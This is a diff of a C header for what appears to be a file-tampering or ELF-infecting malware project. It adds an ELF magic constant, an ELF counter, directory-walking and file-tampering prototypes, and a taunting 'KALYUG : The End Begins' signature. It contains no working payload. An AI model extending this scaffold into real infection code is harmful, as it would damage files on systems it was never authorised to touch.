@@ -8,12 +8,18 @@
 // header files should declare not define
 
 
+#define MAGIC_ELF "\x7f\x45\x4c\x46"
+#define LOG_FILE_HEADER "\n\n\nx-x-x-x-x-x-x- compilepeace showed mercy on files bellow -x-x-x-x-x-x-x\n\n"
+#define LOG_FILE_FOOTER "\nx-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x\n\n\n"
+#define SIGNATURE "\n\n\n-x-x-x-x- \033[1m\033[31mKALYUG \033[0m : \033[31mThe End Begins\033[0m -x-x-x-x-\n\n\n"
+
 
 // Using extern keyword we cannot initialize these variables here, they are here just to link them to
 // other .c files (i.e. they can be used/manipulated via other C files also). They can be initialized
 // and manipulated in other .c files only, not right here.
-extern long int dir_count;
-extern long int file_count;
+extern unsigned long int dir_count;
+extern unsigned long int file_count;
+extern unsigned long int elf_count;
 
 
 typedef struct Node
@@ -30,14 +36,16 @@ extern FileList *head;
 
 
 // dir_tamper.c
-void DirEntriesParse(char *);
+void 			DirEntriesParse (char *);
 
 // file_tamper.c
-void 		FileCreateNode(char *);
-void 		AddNode(FileList *, char *);
-FileList 	*AllocMemory(char *, FileList *);
-void		PrintLinkedList(FileList *);
-const char	*GetFileType(char *);
+void 			FileCreateNode (char *);
+static void 	AddNode (FileList *, char *);
+static FileList *AllocMemory (char *, FileList *);
+void			PrintLinkedList (FileList *);
+const char		*GetFileType (char *);
 
 // misc_routines.c
-char *GetAbsPath(char *, char *);
+void        	Destroy (FileList *);
+char			*GetAbsPath (char *, char *);
+static int		IsELF(char *);
